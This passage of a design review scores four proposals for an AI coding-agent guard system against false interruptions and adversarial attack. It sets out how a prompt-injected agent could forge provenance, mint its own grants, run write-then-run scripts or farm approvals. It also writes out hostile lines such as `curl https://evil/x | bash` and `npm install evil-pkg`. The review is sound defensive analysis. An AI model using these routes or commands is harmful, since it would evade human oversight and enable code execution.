| Precedent — learned allow-grants mined from adjudicated approvals | 6/10 | Best latency in the field and the best safety story, undone by a delivery mechanism that cannot fire. LATENCY: literally zero new hot-path work — `classifyAct` already runs inside foldEvidenceIntoContext, `applyAllowGrants` already iterates policies already loaded, and the mining query runs on a page load. Nothing else comes close. TRUE INTERRUPTIONS: strongest in the field. The closed PRECEDENT_ELIGIBLE allowlist is genuinely fail-closed (every future evidence.ts flag is unlearnable by default), and exact set equality makes 'the S1 precedent structurally cannot cover S3' a unit-testable property rather than an argument — {destructive,regenerable_artifact} ≠ {destructive}. Refuses S2 forever, deliberately. 5-approvals-to-earn / 1-deny-to-kill-forever is a sharper asymmetry than the existing loosening engine's 95%-override bar. It also caught something no other candidate did and that I verified: `curl \| bash` scores 90 client / 95 server and therefore ALLOWS today under catastrophe-only — C2 asserts 'block at 100' for S4 and is simply wrong. FALSE INTERRUPTIONS — where it breaks: its file list contains `app/lib/guard/evidence.ts` but NOT `bash_classifier.py`. I measured the client returning 100 for the S1 command, so the stated 'max(65, 35 client, 45 evidence) = 65' is false; the client's 100 survives the fold and it still BLOCKS. The flagship scenario does not work as specified (one-line fixable, but it is the whole headline). Worse, the learning loop is blind by construction on the owner's actual instance: recon shows 0 approvals ever recorded, 1 require_approval total, and 8/8 documented incidents were BLOCKS — which produce no approval evidence by design. It admits this as FN-1, honestly, but honesty about delivering nothing is still delivering nothing. Cold start of ≥5 approvals across ≥2 calendar days against a complaint that is about the FIRST occurrence. S5 explicitly unfixed, damage bound stated as unbounded. |
| Task Envelope Authorization (Reach-Bounded Envelopes) | 5/10 | Best latency profile, real friction win on one shipped class, but it misses the owner's literal complaint on his own configuration. LATENCY: the standout. The pass returns immediately unless `acc.highestDecision === 'require_approval'`, so the atomic UPDATE and the refusal write only touch would-be interruptions — per recon that is ~1 of 112 real decisions. Effectively free on the allow path; the mint rides UserPromptSubmit, off the hot path entirely. Best engineering discipline on this axis. FALSE INTERRUPTIONS: it does eliminate a genuinely shipped friction source — claude-code-starter's categorical require_approval on action_types [api] and [build]; `npm install` grades R0 (not in NON_LOCAL_VERB_RE, which lists npm publish/login/link but not install) and gets covered. That is real. But it does NOT fix the classifier, and it concedes outright that under bare catastrophe-only the S1 block STANDS. I verified that block is real (100). So the owner's headline scenario survives this design untouched on his own default pack. The constant-authority envelope (prompt never widens scope; nothing to infer, nothing to review) is the cleanest security-per-complexity idea in the field and deserves credit. TRUE INTERRUPTIONS: S3 dies twice over (TTL expiry + `~` failing isWorkspaceRelative) — correct. S4 is refused three ways with the injected claim structurally inexpressible — correct and well-argued. But S5 refuses BOTH calls, which is safe and simultaneously a precision LOSS: the local migrate the owner literally just asked for still interrupts him, and no scope-creep discrimination is gained. That is the definition of not calibrating. Biggest efficacy risk: `computeReach` introduces a brand-new regex surface (NON_LOCAL_VERB_RE, URL_OR_HOST_RE, NEVER_R0_PATH_RE) — precisely the kind of naive-pattern layer that produced the 8 documented false positives in the first place. It risks re-creating the disease it was built to cure. Its own FN-1 (`rm -rf src` covered at R0) is mostly neutralized in practice because I measured that command at 100 → block, but that safety comes from the block rail it explicitly refuses to improve, not from its own design. |
| Intent Warrants — server-signed attribution receipts that narrow, never widen | 3/10 | Safe, well-argued, and close to inert on the owner's actual pain. Its flagship S1 walkthrough is empirically false: it claims risk 65 and an evidence `regenerable_artifact` flag, but I ran the shipped classifier on that exact command and got 100, with `.every(isRegenerableArtifactTarget)` failing on `node_modules/.cache` so the flag is never set. It proposes no classifier fix (it explicitly scopes the blunt-70/mirror work out). Gate 7 (risk ≤ 84) and Gate 1 (never touches block) then BOTH refuse. So the design does nothing for the complaint that names it. This is structural, not incidental: I measured essentially every destructive/security command at client-100 (`rm -rf src` 100, both force-push forms 100, the S1 cleanup 100), all far above the 84 ceiling — and under catastrophe-only there is no risk-driven require_approval below 84 for it to clear either. The relief surface on the owner's configuration is close to empty. It concedes this in FN-6 ('My design does nothing for that class'). Its S5 defense also leans on a rail recon already proved dead: it claims a production DSN puts `production`/`postgres` into systems_touched and pushes past 84, but the hook always sends `systems_touched=[tool_info['category']]` = ['execution'], so that modifier never fires — one of three claimed S5 rails does not exist. TRUE INTERRUPTIONS: fine — the min() grade (not average) correctly zeroes S5's second call, the intersection-only envelope means forged prompt text buys nothing outside a pre-blessed ceiling, and S3 dies on expiry + denylist + gate 1. No safety regression. But safety with no efficacy is the status quo plus a signing key. LATENCY: guard-time cost genuinely near-zero (one HMAC verify, ceiling rides the existing settings read) — its best property — but it taxes the human's own prompt submit with up to 2s, and it adds an NLP-shaped synonym mapper that must stay in vocabulary sync with two classifiers recon already documented disagreeing with each other (`npm run`/`npx` → 'other' via the mismatch swap), which is the most likely thing here to silently rot. |

**Fatal flaws**

- [Intent Warrants — server-signed attribution receipts that narrow, never widen] FIXABLE — The headline scenario does not work. I ran the shipped classifier: `rm -rf ./dist ./node_modules/.cache` returns 100, not the 65 the walkthrough claims, because `node_modules/.cache` fails the bare-name `isRegenerableArtifactTarget` set and `.every()` fails — so the `regenerable_artifact` flag Gate 8 depends on is never set. The design proposes no classifier fix, and Gate 7 (≤84) plus Gate 1 (never touches block) then both refuse. Since nearly every destructive command measures at client-100, and catastrophe-only has no risk-driven require_approval below 84, the relief surface on the owner's own configuration is close to empty. Compounding it, the S5 defense cites a production `systems_touched` modifier that recon already proved dead (the hook always sends ['execution']).
- [Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling] FIXABLE — It manufactures NEW false interruptions in the exact window where nobody can clear them. The A0 + R? + hotGoal branch floors to require_approval using the declared_goal regex family, and R? is the catch-all for every wrapper command (`make`, `just`, `npm run X`, all MCP calls) — which by its own admission is most of the friction surface. An overnight unattended run with innocent goal text containing 'push' or 'migrat' backs the approval queue up until morning. Second, the first-install grace deliberately fails OPEN to A1 for any org that has never stamped a human turn, which is the one place the design abandons fail-closed. Third and separately, its S4 verdict ('block at 100') is factually wrong — I measured `curl | bash` at 95, which ALLOWS today under catastrophe-only.
- [Precedent — learned allow-grants mined from adjudicated approvals] FIXABLE — Two independent blockers. (1) The label fix is server-only: the file list touches `evidence.ts` but not `bash_classifier.py`, and I measured the client still sending 100 for the S1 command, which wins the max() fold and keeps it blocked. The stated 'max(65, 35 client, 45 evidence) = 65' is empirically false. (2) The learning loop cannot fire on the owner's instance — it mines `approved_by`, but recon shows 0 approvals ever recorded and all 8 documented incidents were BLOCKS, which produce no approval evidence by design. Blocker 1 is a one-line mirror edit; blocker 2 requires recording block-override events as labels, which the design explicitly scopes out, so as written it can deliver literally nothing on day one and plausibly ever.
- [Task Envelope Authorization (Reach-Bounded Envelopes)] FIXABLE — It misses the complaint it was built for. It does not touch the classifier and concedes that under bare catastrophe-only — the owner's actual default pack — the S1 block STANDS, and I verified that block is real (risk 100). Its wins are confined to packs with categorical require_approval on action_type. On S5 it refuses BOTH calls, which is safe but is a precision loss: the local migrate he just asked for still interrupts, and zero scope-creep discrimination is gained. Separately, `computeReach` introduces a fresh naive-regex layer (NON_LOCAL_VERB_RE, URL_OR_HOST_RE) of exactly the kind that produced the 8 documented false-positive incidents, risking re-creating the disease.

**Best idea to graft:** From Precedent (ranked 2nd): persist the server-derived `evidence.flags` that `foldEvidenceIntoContext` (evaluate.ts:841-885) already computes and throws away, and gate all relief on a CLOSED allowlist of exact flag-set equality rather than on a derived class. Two reasons this belongs in Floor & Ceiling. (1) Substrate: C2's R-ladder re-derives recoverability from those same flags, so persisting them into `guard_decisions.context._risk_breakdown` (additive-jsonb, zero migration) costs nothing on the hot path, makes every relief decision auditable after the fact on /decisions, and is the only way to later measure whether the calibration actually worked. (2) Safety mechanism: C2's relief currently rests on the R-ladder's derivation being right — a 5-bucket function with an R? catch-all. Precedent's grain is finer and provably fail-closed: an enumerated allowlist keyed on exact set equality means every future evidence.ts flag is non-relievable BY DEFAULT, and 'the S1 relief structurally cannot cover S3' becomes a unit test ({destructive,regenerable_artifact} ≠ {destructive}) instead of an argument. Graft the closed-allowlist admission rule and the exact-set-equality match onto C2's R0/R1 relief gate, plus Precedent's 1-denial-kills-it-forever asymmetry as the revocation rule for attendance relief. Also graft its verified correction: `curl | bash` scores 95 and ALLOWS today under catastrophe-only — C2's S4 claim of 'block at 100' is wrong and the winner must not ship that assumption.

**Verdict:** Floor & Ceiling wins on this lens, and the margin is empirical rather than rhetorical. I ran the shipped classifier and found the owner's benign multi-target cleanup scoring 100 — identical to deleting his home config directory — and hard-BLOCKING under his default pack. That single measurement disqualifies half the field: C1 and C4 never touch `block`, so they cannot reach the complaint at all, and C3 patches only the server half while the client's 100 wins the max() fold. C2 is the only design that mirrors the fix into both `evidence.ts` and `bash_classifier.py` in one commit and names mirror-drift as the hazard. It is also the only one that buys quiet without selling safety: S1 goes to allow at every attendance tier (it doesn't even spend the trust mechanism there), S3 gets an ungrantable floor stacked ON TOP of the existing block, and S5 produces two different verdicts from byte-identical commands separated only by time-since-the-human-spoke. That last property is the actual definition of precision of interruption, and no other candidate produces it — C3 and C1 concede S5, C4 refuses both calls and calls it safety. Its relief ceiling is honest too: forged attendance buys R0/R1 only, which I confirmed are already allow/warn today, so net new authority under total client compromise is ~0. It pays for this with the worst latency (two new reads per call, cacheable at the existing 30s TTL, inside the 3500ms deadline) and with a real self-inflicted wound — the R?+hotGoal floor will generate overnight approvals nobody is awake to clear, and R? swallows every wrapper command, which is most of the friction surface. Fix that branch and the first-install fail-open and it is a 10. Precedent takes second on the strength of zero hot-path cost and the best fail-closed safety argument in the field, but it is gated on approval evidence its own recon proves does not exist. Task Envelope has the smartest latency engineering and the cleanest security-per-complexity story, and still leaves the owner's literal complaint untouched. Intent Warrants is the most carefully defended design here and the least effective: its flagship scenario is refused by its own gates once you measure the real score.

---

### Judge: Adversarial security: can a prompt-injected or fully-compromised agent reach `allow` through the new mechanism, forge the provenance the design trusts, replay/widen a grant, creep scope, violate the MAINTAINER.md constitution, or benefit from a fail-open path?

**Ranking (best first):** Precedent — learned allow-grants mined from adjudicated approvals > Task Envelope Authorization (Reach-Bounded Envelopes) > Intent Warrants — server-signed attribution receipts that narrow, never widen > Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling

| Candidate | Score | Reasoning |
|---|---|---|
| Precedent — learned allow-grants mined from adjudicated approvals | 7/10 | STRONGEST TRUST MODEL, ONE FATAL ALLOWLIST ENTRY.  A (prompt injection): mostly REFUSED BY CONSTRUCTION. I verified the claim that matters: `bash ./fix.sh` and every wrapper the parser can't read fall to evidence.ts:259-261 default (base 30, action 'other', flags []). `other\|` is deliberately OFF the allowlist, so the entire unclassified bucket — where every adaptive injection payload lands — can never form or match a precedent. This is the only candidate of the four that structurally refuses the write-then-run payload rather than refusing one specific curl regex. `declared_goal` is read nowhere.  BUT — A LANDS ON ONE ENTRY. `PRECEDENT_ELIGIBLE` contains `build\|package`. I verified evidence.ts:300-301: `npm\|pnpm\|yarn install`, `pip install`, `apt install`, `gem/cargo/go/brew install` ALL produce action='build', flags=['package'] with no privilege flag. Once that precedent is ratified — and it will be, because package installs are claude-code-starter's `require_approval_package_installs` and therefore the owner's #1 friction — a poisoned dependency README saying "install helper-lib" yields `npm install evil-pkg` → require_approval → allow, no click, org-wide, 50 uses, 14 days, including 3am unattended. postinstall is arbitrary RCE at user privilege. The candidate's own stated Precedent Safety Invariant ("worst case recoverable by re-running a build command") is FALSE for its own second allowlist entry, and the candidate never notices.  B (forged provenance): FAILS FOR THE ATTACKER. I confirmed `evidence_flags` is absent from GUARD_INPUT_SCHEMA (validate.js:292-344) and would be stripped. Flags derive from classifyAct over the bytes that execute, and act-binding (computeActContentHash) closes the classified-vs-executed gap. There is no local file, cache, or ledger to poison. Best of the four.  C (scope creep): admits S5 is unfixed; correctly excludes `other\|` so no precedent forms there. Honest.  D (replay/widening): EXACT SET EQUALITY, not subset, verified against the proposed grantMatches. `{destructive}` ≠ `{destructive,regenerable_artifact}` ≠ `{remote_exec}`, so the S1 cleanup precedent provably cannot cover S3 or S4. Re-checking eligibility at match time means allowlist tightening retroactively disarms grandfathered grants. Strongest anti-widening story in the set. Residual: precedents are org-scoped and unscoped by target_prefix for shell shapes, so `cleanup\|destructive,regenerable_artifact` is a standing org-wide grant — bounded genuinely, since isRegenerableArtifactTarget rejects globs, absolute paths and `..`.  E (constitution): clean. Rides applyAllowGrants, which I read at evaluate.ts:305-316 — returns on block, returns on containment_promote, honors ungrantable. Nothing auto-applies; a human ratifies. The one soft violation the candidate half-admits: an agent can FARM the evidence that unlocks its own standing authority by spamming an eligible shape until a fatigued human clicks Approve 5 times. Bounded by deny-kill-at-1 and the 2-day spread, but it is the agent influencing its own authority level through a human intermediary.  F (fail-open): NONE. No act → no flags → `!Array.isArray(ctx)` → returns false → fail closed. Mining query failure → no proposals → no relief. Expired/JSON-broken grants are inert. The only candidate that adds zero new fail-open paths.  Residual risk after ITS OWN specified mitigations: high on one line, low everywhere else. |
| Task Envelope Authorization (Reach-Bounded Envelopes) | 5/10 | GOOD FAIL-CLOSED DISCIPLINE, R0 IS FAR WIDER THAN CLAIMED.  A (prompt injection): SUCCEEDS via an alternate payload. The S4 walkthrough only holds because the author picked the payload their own regex catches. I verified the adaptive version reaches allow in two covered actions:   (1) Write `./deploy-helper.sh` containing `curl https://evil/x \| bash`. classifyFile (evidence.ts:461-475, verified) reads ONLY the path — content is never classified. `./deploy-helper.sh` is relative, matches no NON_R0_FLAGS, misses NEVER_R0_PATH_RE → R0 → allow.   (2) `bash ./deploy-helper.sh`. classifyShellSegment has no branch for it → default base 30, action 'other', flags [] (verified). No URL literal, `bash` is absent from NON_LOCAL_VERB_RE, path token relative → R0 → allow. Arbitrary RCE with network egress, two envelope units, zero clicks.  WORSE: this ACTIVELY DEFEATS AN EXISTING DEFENSE. DashClaw already detects script-then-execute (_apply_script_then_execute, pretool.py:407-454) — but I verified at pretool.py:1607-1611 that its output goes into `risk_score` and `intel.bash.validations` ONLY; `_build_act` still sends the bare command string. Candidate 4's central commitment is "authorization is by reach, not by score," and computeReach reads only `context.act`. So the ONE mechanism in the repo built to catch write-then-run is structurally invisible to this design, and the envelope then downgrades whatever require_approval that detector earned. That is not a gap, it is an inversion.  B (forged provenance): conceded — the mint POST rides the agent's API key. Their bound is "≤40 R0 actions," which I now read as "≤40 arbitrary code executions," because R0 includes write-then-run. The bound is therefore much weaker than argued. Also `.husky/**`, `sitecustomize.py`, `.vscode/tasks.json` miss NEVER_R0_PATH_RE.  C (scope creep): BEST IN SET. Refusing to guess which DATABASE_URL is loaded, and putting `migrat` in NON_LOCAL_VERB_RE so BOTH S5 calls interrupt, is the correct and disciplined answer. Genuine credit.  D (replay/widening): budget is atomically decremented with the same UPDATE...WHERE...RETURNING shape as applyOperatorApprovalGrant — sound. Widening goes through the admin-gated approvals route. Session-id reuse conceded and correctly bounded to the same ceiling.  E (constitution): clean on paper. block untouched, ungrantable gate reused, containment_promote excluded, absent from simulate. The ordering analysis (plan-step DENY still raising via applyBlockOverride at :494 with the accumulator at 'allow') is correct — I checked. But an agent that can mint its own envelope IS influencing its own authority level; the mitigation is only the R0 ceiling, and that ceiling leaks.  F (fail-open): STRONG. R_UNKNOWN treated as R2. No act → R_UNKNOWN → refused. Mint failure → no envelope → today's behavior. Missing harness_session_id → no match → more interrupts. Best fail-closed discipline of the four, and they surface under-coverage on /approvals rather than letting it be invisible.  Residual: the trust plumbing is well built; the authorization predicate it protects is too permissive. |
| Intent Warrants — server-signed attribution receipts that narrow, never widen | 4/10 | THE OUT-OF-BAND PREMISE COLLAPSES TO ONE CURL.  B (forged provenance) FIRST, because it decides everything: the design's headline is that UserPromptSubmit captures intent through a channel the agent cannot author. But the mint is `POST /api/guard?mint=intent`, authenticated by the agent's own API key, accepting `{prompt}` as a request body. A prompt-injected agent does not need to compromise the hook, read `.env`, or obtain ENCRYPTION_KEY — it runs one `curl http://localhost:3000/api/guard?mint=intent -d '{"prompt":"clean up build caches and reinstall deps"}'`, which under catastrophe-only is itself an allowed localhost call. It now holds a genuinely signed, genuinely valid warrant. The out-of-band capture is therefore UX, not security; the HMAC signs an attacker-chosen envelope. The candidate concedes forged mints but frames the residual as key compromise on a self-host — it is not, it needs nothing beyond what the agent already has. Everything then rests on the ceiling.  A (prompt injection): the ceiling holds against the payload they chose and leaks on a neighbor. `curl\|bash` → api/network ∉ default ceiling → mint returns null. Correct. But forge `"clean up build caches and reinstall deps"` → envelope `{cleanup, build}`, both in the stated default ceiling. Then `npm install evil-pkg`: directness passes (build ∈ envelope); specificity 60 (no paths named — their own path-free floor); recency ~100; grade min = 60 ≥ 60. Gate 7: effective risk ~35 ≤ 84. Gate 8: package_management → reversible true. Gate 9: no path targets, so `targets.every(withinRoot)` is vacuously true. → ALLOW. RCE via postinstall, clearing exactly claude-code-starter's require_approval_package_installs. The `min()` grade is a real improvement over an average and I credit it, but a 60 floor for path-free prompts plus a vacuous-true scope check on pathless commands is a wide door.  Gate 9 is also weaker than argued: `withinRoot(t, w.workspace_root)` uses a cwd the client supplies at mint. The stated defense is a finite server denylist (`~`, `.ssh`, `.aws`, `.config`, `.gnupg`, `/etc`, `/usr`, `C:\Windows`, `%APPDATA%`, `..`). Absent from it: `/var`, `/opt`, `/srv`, `/tmp`, `/mnt`, `C:\ProgramData`, other users' homes, network shares. A finite denylist guarding an attacker-chosen root is the wrong shape; only gates 7/8 and the action-type intersection stop the obvious follow-ups.  C (scope creep): genuinely good. Three independent catches on S5 (TTL expiry, systems_touched bump past 84, out-of-root target), and the MIN-not-average argument is correct and well made.  D (replay): CONCEDED AND UNBOUNDED IN COUNT. FN-2 admits an unlimited number of in-envelope actions for the full 20-minute window; the only counter is rate_limit_runaway_safety, which merely warns.  E (constitution): block excluded, ungrantable honored, evidence-only gate, live ceiling re-read from DB (a real kill switch — good). But an agent that mints its own warrant is selecting its own authority slice, which is the self-approval smell the lens exists to catch.  F (fail-open): mostly fail-closed (no warrant / bad signature / expired / ceiling off → no downgrade). One unhandled path: `getIntentCeiling` is awaited with no try/catch inside the pass. NEW EXPOSURE: raw prompt text is persisted to session_events and rendered on /decisions. Prompts are exactly where humans paste credentials. Redaction appears in the failure-modes prose but nowhere in the design or gate list — this turns a governance feature into a secret-storage surface.  Residual: the gate stack is the most layered of the four and does real work, but it is defending a signal the attacker mints at will. |
| Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling | 3/10 | BEST IDEA IN THE SET, WORST RELIEF SECURITY, AND AN EXPLICIT FAIL-OPEN.  F (fail-open) FIRST, because it is disqualifying on this lens: `resolveAttendance` returns `{tier:'A1'}` when `!row.ever_stamped`. That is a documented, deliberate fail toward the RELIEF tier in a repo whose stated bar is that anything failing toward allow is disqualifying, and whose v4.72.1 incident was the governor silently not enforcing. Its blast radius is the entire installed base on upgrade day: no org has ever stamped a human turn, so every org sits at A1 = attended until someone installs a new hook event and restarts sessions. The candidate calls the grace "bounded" — it is unbounded in population and indefinite in time for any org that never installs the hook, which per their own PLUGIN_PARITY analysis includes every Codex and Claude Desktop install permanently.  B (forged provenance): I verified the mint. `PATCH /api/sessions/[sessionId]` (route.ts:28-33) authenticates with `getOrgId(request)` — the agent's own API key, nothing more. One HTTP call mints A1. Conceded.  THE LOAD-BEARING CLAIM IS FALSE. The design rests on: "Net new authority from a complete attendance forgery: zero," because R0/R1 are "already allow and warn under the shipped catastrophe-only pack today." That argument silently swaps packs. Under claude-code mode — the stated beachhead default — I verified compile.ts:36-54 protects `schema/**`, `drizzle/**`, `app/api/approvals/**`, `app/api/policies/**`, `sdk/**`, `**/auth/**` at require_approval, with no `ungrantable` flag set by the mode builder. None of those paths trip evidence.ts's SENSITIVE_PATH_RE (`.env\|secret\|credential\|private_key\|.pem\|id_rsa\|.key`) or CI_CONFIG_RE. So they classify R1 — relative, in-workspace, no sensitive_path, no ci_config — and a FORGED A1 downgrades require_approval to warn on a write to `app/api/approvals/[actionId]/route.ts`. That is the agent silently editing the human-approval gate and the anti-self-approval check itself, plus migrations and the SDK, with one forged HTTP call. Net new authority from attendance forgery is not zero; it reaches the control plane.  A (prompt injection): correctly REFUSED, and this is the design's best moment. The R gate is read BEFORE the A gate, so a genuinely-true attendance signal is never consulted for an irrecoverable act. `remote_exec` → R4 → relief returns before attendance is read. Structurally right, and the ordering is deliberate rather than lucky.  C (scope creep): partially caught, and FN-1 is admitted with unusual honesty — a production migration at T+2min instead of T+31min is fully covered with an unbounded damage bound.  D (replay/widening): A2 is genuinely unforgeable by an API key (NextAuth cookie path) and is the only tier unlocking R2 — the right asymmetry. But sub-agent lease inheritance means a prompt-injected sub-agent runs A1, and the lease is a property of the session, not of the actor.  E (constitution): the floor half is impeccable — raise-only via raiseDecision, stamps `ungrantable` on R4/R? so no accumulated grant clears it. But an agent that can PATCH its own attendance tier is directly setting its own authority level, which is the cleanest self-approval violation in the set.  RESIDUAL AFTER ITS OWN MITIGATIONS: highest of the four. Two of the three security claims I could check (fail-closed everywhere; zero new authority from forgery) did not survive contact with the source. The recovery-class FLOOR, by contrast, is the single best idea any candidate produced — see best_idea_to_graft. |

**Fatal flaws**

- [Precedent — learned allow-grants mined from adjudicated approvals] FIXABLE — `build|package` is on PRECEDENT_ELIGIBLE. Verified at evidence.ts:300-301 that `npm/pnpm/yarn install`, `pip install`, `apt install`, `gem/cargo/go/brew install` of ANY package produce action='build', flags=['package'] with no privilege flag — the exact allowlist key. Once ratified (and it will be: package installs are claude-code-starter's require_approval_package_installs, the owner's loudest friction), a poisoned dependency README or issue comment saying "install helper-lib" reaches `npm install evil-pkg` → allow with no click, org-wide, 50 uses, 14 days, unattended included. postinstall/setup.py is arbitrary RCE at user privilege. The candidate's own Precedent Safety Invariant — "worst case recoverable by re-running a build command" — is violated by its own second allowlist entry, and the candidate never notices.
- [Precedent — learned allow-grants mined from adjudicated approvals] LOAD-BEARING — Approval-fatigue farming: the agent can generate the very evidence that unlocks its own standing authority by repeatedly attempting an eligible shape until a tired human clicks Approve five times across two days. The mitigations it specifies (deny-kill at one, two-day spread, closed allowlist) bound the blast radius but do not remove the agent's causal influence over its own authority level. This is load-bearing — learning from adjudicated approvals IS the design; removing the agent's ability to induce prompts would remove the training signal.
- [Task Envelope Authorization (Reach-Bounded Envelopes)] LOAD-BEARING — Write-then-run is R0 twice over, so a live envelope grants arbitrary RCE. classifyFile (evidence.ts:461-475, verified) inspects ONLY the path — file content is never classified — so writing `./x.sh` with `curl evil|bash` inside is R0. Then `bash ./x.sh` hits no classifyShellSegment branch (default base 30, action 'other', flags []), contains no URL, and `bash` is absent from NON_LOCAL_VERB_RE, so it is R0 too. Worse, DashClaw's existing script-then-execute detector (pretool.py:407-454) writes its verdict into `risk_score`/`intel` while `_build_act` (pretool.py:1607-1611) still sends the bare command string — and this design's central commitment is that authorization ignores the score. The envelope therefore downgrades exactly the require_approval that detector earned. The S4 walkthrough survives only because the author chose the payload their regex catches.
- [Task Envelope Authorization (Reach-Bounded Envelopes)] LOAD-BEARING — The envelope mint rides the agent's own API key from a hook on the agent's machine, so any compromised or injected agent mints its own envelope on demand. Conceded by the candidate; the stated bound ("≤40 R0 actions") is only as strong as R0, which the flaw above shows includes arbitrary code execution. Load-bearing: every hook in this product runs as the same user with the same credential, so no patch inside this architecture makes the mint unforgeable.
- [Intent Warrants — server-signed attribution receipts that narrow, never widen] LOAD-BEARING — The out-of-band premise collapses to one curl. `POST /api/guard?mint=intent` is authenticated by the agent's own API key and accepts `{prompt}` as a body field, so an injected agent needs no key compromise, no `.env` read, and no hook tampering — it POSTs fabricated prompt text (a localhost call that catastrophe-only allows) and receives a genuinely signed warrant. The HMAC then attests to an attacker-chosen envelope. The UserPromptSubmit capture provides UX, not security. Load-bearing: any endpoint the local hook can reach, the local agent can reach.
- [Intent Warrants — server-signed attribution receipts that narrow, never widen] FIXABLE — Forged prompt `"clean up build caches and reinstall deps"` mints envelope {cleanup, build}, both inside the stated default ceiling. `npm install evil-pkg` then passes every gate: directness (build ∈ envelope), specificity 60 (the design's own floor for path-free prompts), recency ~100, grade 60 ≥ 60, risk ~35 ≤ 84, reversible true, and gate 9's scope check is VACUOUSLY TRUE because a pathless command yields an empty target array. Result: allow, clearing claude-code-starter's require_approval_package_installs. Related: gate 9's `withinRoot` uses a client-supplied cwd guarded only by a finite server denylist that omits /var, /opt, /srv, /tmp, /mnt, C:\ProgramData and other users' homes.
- [Intent Warrants — server-signed attribution receipts that narrow, never widen] FIXABLE — Raw human prompt text is persisted to session_events and rendered on /decisions — and prompts are precisely where operators paste credentials. Redaction appears only in the failure-modes prose, never in the mint code path or the gate list. As specified, this converts a governance feature into a secret-storage-and-display surface.
- [Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling] FIXABLE — Explicit fail-open on a missing signal: `resolveAttendance` returns A1 (the relief tier) whenever `!row.ever_stamped`, because "unattended" and "hook not installed" are indistinguishable. In a repo whose stated disqualifier is anything failing toward allow, and whose v4.72.1 incident was the governor silently not enforcing, this fails toward relief for the ENTIRE installed base on upgrade day, and permanently for Codex and Claude Desktop installs which by the candidate's own parity analysis can never stamp.
- [Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling] FIXABLE — The central security claim — "net new authority from a complete attendance forgery: zero, because R0/R1 are already allow/warn" — is false, and it is false by swapping packs mid-argument. A1 is minted by `PATCH /api/sessions/[sessionId]`, authed by `getOrgId(request)` alone (route.ts:28-33, verified) = the agent's own API key. Under claude-code mode, the stated beachhead default, compile.ts:36-54 protects `schema/**`, `drizzle/**`, `app/api/approvals/**`, `app/api/policies/**`, `sdk/**`, `**/auth/**` at require_approval with no ungrantable flag; none trip evidence's SENSITIVE_PATH_RE or CI_CONFIG_RE, so all classify R1. One forged HTTP call therefore downgrades require_approval to warn on writes to the approvals route (the anti-self-approval gate itself), the policy routes, and migrations. Attendance forgery reaches the control plane. Mechanically patchable by restricting relief to R0 only — which removes most of the design's claimed value.

**Best idea to graft:** Graft Floor & Ceiling's BLAST-RADIUS FLOOR — its raise-only half only, discarding attendance-as-relief entirely.

Specifically: `classifyRecovery()` as a pure server-side function of the act bytes (R0 self-healing / R1 workspace-git-recoverable / R2 reflog-or-lease-protected / R3 hand-rebuildable / R4 irrecoverable / R? unprovable), plus `foldRecoveryHints()`'s D1-prime monotonicity rule (client hints may only move the class TOWARD irrecoverable, never away), plus — the part that matters most — `applyBlastRadiusFloor` stamping `ungrantable: true` on the gating ledger for R4 and R? when no human turn has been observed inside the TTL.

Why the winner needs it. Precedent's own worst admitted hole is that ratified precedents are org-scoped and therefore fire at 3am on an unattended run exactly as they do at the keyboard, with nothing but a 50-use counter between an injected agent and 50 free uses of a learned shape. Because `applyAllowGrants` consults `acc.gatingPolicies` for an `ungrantable` entry BEFORE it matches any grant (verified at evaluate.ts:308-316), an unattended R4/R? floor stamped ungrantable automatically neutralises every precedent — including the `build|package` entry that is Precedent's fatal flaw — for exactly the window in which nobody is watching. One mechanism, zero new code in the grant path, closes both problems at once.

It is also the only proposal across all four candidates that ADDS governance instead of only removing it, and it is D1-safe by construction: it flows through the existing one-directional `raiseDecision`, never writes `allow`, never touches `block`, and reads no client-authored field to lower anything. Two of its concrete sub-pieces are worth taking verbatim: splitting `--force-with-lease` out of the `vcs_dangerous` branch (evidence.ts:296 currently conflates it with bare `--force`, and the lease flag is byte-proof recoverability, not a claim), and widening `isRegenerableArtifactTarget` (evidence.ts:107) to proper relative subtrees so `node_modules/.cache` stops scoring HIGHER than `node_modules` — a real monotonicity bug I confirmed in source, and the direct cause of the owner's S1 complaint.

Graft the floor. Leave the ceiling: attendance-as-relief is forgeable with one API-key PATCH, fails open on first install, and reaches claude-code mode's protected control-plane paths.

**Verdict:** Ranked by residual risk after each candidate's OWN specified mitigations, not the ones I could imagine adding.

PRECEDENT wins my lens, and not narrowly. It is the only design where the signal that lowers a decision is server-derived from bytes that must actually execute, is structurally unforgeable (evidence_flags is absent from GUARD_INPUT_SCHEMA and would be stripped — I checked the literal), requires a human ratification click before any relief exists at all, matches on EXACT set equality so no learned shape can generalize into a neighbor, and introduces zero new fail-open paths. Critically, it is the only candidate that refuses the adaptive prompt-injection payload BY CONSTRUCTION rather than by regex: `bash ./x.sh` and every wrapper the parser cannot read land in `other|`, which is deliberately off the allowlist. The other three all catch `curl evil|bash` and all miss write-then-run.

Its one fatal flaw is a single allowlist line. Delete `build|package` and the design is sound; keep it and a poisoned README reaches RCE with no click. That entry must not ship, and the allowlist needs the same ratchet discipline as the surface budget — an addition is a recorded decision with a stated damage ceiling, never a convenience edit, because the pressure to re-add `build|package` (it is the owner's loudest friction) will be immediate and constant.

TASK ENVELOPE is second on the strength of its fail-closed plumbing — R_UNKNOWN treated as R2, no client field trusted, atomic budget consumption, under-coverage surfaced rather than hidden — and its S5 answer (refusing to guess which DATABASE_URL is loaded, so both migrations interrupt) is the most disciplined scope-creep handling in the set. But its authorization predicate leaks: R0 permits write-then-run RCE, and by committing to \"reach, not score\" it structurally nullifies the one detector this repo already built for that exact chain.

INTENT WARRANTS has the most layered gate stack and the MIN-not-average grading is genuinely right, but it is defending a token the attacker mints at will with one localhost curl. \"Out-of-band\" is doing no work; strip it and the design is a self-service allow_grant with a 20-minute timer. It also adds a raw-prompt-text store with redaction mentioned only in prose.

FLOOR & CEILING is last on THIS lens only, and the ranking should not be read as a verdict on the idea. Two of its three checkable security claims did not survive contact with source: it fails open on a missing signal for the entire installed base, and its \"zero new authority from forgery\" argument silently swaps from claude-code mode to catastrophe-only, hiding that a forged attendance stamp reaches the approvals route and the migration directory. But its RECOVERY-CLASS FLOOR is the strongest single idea any candidate produced and the only one that adds governance rather than only removing it. The right outcome is Precedent's trust model carrying Floor & Ceiling's floor — see best_idea_to_graft.

---

